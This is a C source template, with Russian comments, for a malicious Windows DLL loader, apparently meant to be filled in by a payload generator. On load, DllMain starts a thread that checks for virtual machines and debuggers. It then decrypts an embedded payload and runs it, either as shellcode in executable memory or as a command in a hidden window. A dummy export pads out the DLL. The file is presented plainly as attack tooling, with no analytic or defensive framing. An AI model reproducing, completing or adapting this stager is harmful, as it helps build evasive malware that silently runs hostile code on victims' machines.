#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

// Зашифрованная полезная нагрузка
unsigned char encrypted_payload[] = { {{PAYLOAD}} };
const size_t payload_size = {{PAYLOAD_SIZE}};

// Ключ и вектор инициализации для расшифровки
unsigned char encryption_key[] = { {{KEY}} };
const size_t key_size = {{KEY_SIZE}};
unsigned char initialization_vector[] = { {{IV}} };

// Тип полезной нагрузки (shellcode/command)
{{PAYLOAD_TYPE}}

// Функция для расшифровки
{{DECRYPT_FUNC}}

// Функции обнаружения виртуальных машин и отладчиков
{{ANTI_VM_CODE}}
{{ANTI_DEBUG_CODE}}

// Глобальные переменные
BOOL g_bPayloadExecuted = FALSE;
HMODULE g_hModule = NULL;

// Функция создания нового процесса
BOOL CreateHiddenProcess(const char* command) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    ZeroMemory(&pi, sizeof(pi));
    
    // Создаем процесс
    if (!CreateProcessA(NULL, (LPSTR)command, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Закрываем дескрипторы
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

// Функция выполнения шелл-кода
DWORD WINAPI ExecuteShellcode(LPVOID lpParameter) {
    unsigned char* shellcode = (unsigned char*)lpParameter;
    
    // Выделяем память с правами на исполнение
    LPVOID exec_mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        return 1;
    }
    
    // Копируем шелл-код в выделенную память
    RtlMoveMemory(exec_mem, shellcode, payload_size);
    
    // Выполняем шелл-код
    ((void(*)())exec_mem)();
    
    // Освобождаем память (это никогда не выполнится, если шелл-код не вернет управление)
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}

// Функция выполнения полезной нагрузки
void ExecutePayload() {
    // Проверка на виртуальные машины и отладчики
    if (isVirtualMachine() || isDebugged()) {
        return;
    }
    
    // Расшифровываем полезную нагрузку
    unsigned char* decrypted_data = (unsigned char*)malloc(payload_size);
    if (!decrypted_data) {
        return;
    }
    
    decrypt_payload(encrypted_payload, payload_size, encryption_key, initialization_vector, decrypted_data);
    
    if (strcmp(type_var, "shellcode") == 0) {
        // Выполняем шелл-код в отдельном потоке
        HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, decrypted_data, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
    } else if (strcmp(type_var, "command") == 0) {
        // Выполняем команду
        char* command = (char*)malloc(payload_size + 1);
        if (command) {
            memcpy(command, decrypted_data, payload_size);
            command[payload_size] = '\0';
            
            CreateHiddenProcess(command);
            free(command);
        }
    }
    
    // Очищаем расшифрованные данные
    if (decrypted_data) {
        memset(decrypted_data, 0, payload_size);
        free(decrypted_data);
    }
}

// Точка входа DLL (вызывается при загрузке библиотеки)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    g_hModule = hinstDLL;
    
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Отключаем уведомления о загрузке потоков
            DisableThreadLibraryCalls(hinstDLL);
            
            // Выполняем полезную нагрузку асинхронно
            if (!g_bPayloadExecuted) {
                HANDLE hThread = CreateThread(NULL, 0, 
                                (LPTHREAD_START_ROUTINE)ExecutePayload, 
                                NULL, 0, NULL);
                if (hThread) {
                    CloseHandle(hThread);
                    g_bPayloadExecuted = TRUE;
                }
            }
            break;
            
        case DLL_PROCESS_DETACH:
            // Очистка при выгрузке DLL
            break;
    }
    
    return TRUE;
}

// Экспортируемая функция, чтобы DLL не была полностью пустой
__declspec(dllexport) void DummyFunction() {
    // Ничего не делает, просто заглушка
    return;
} 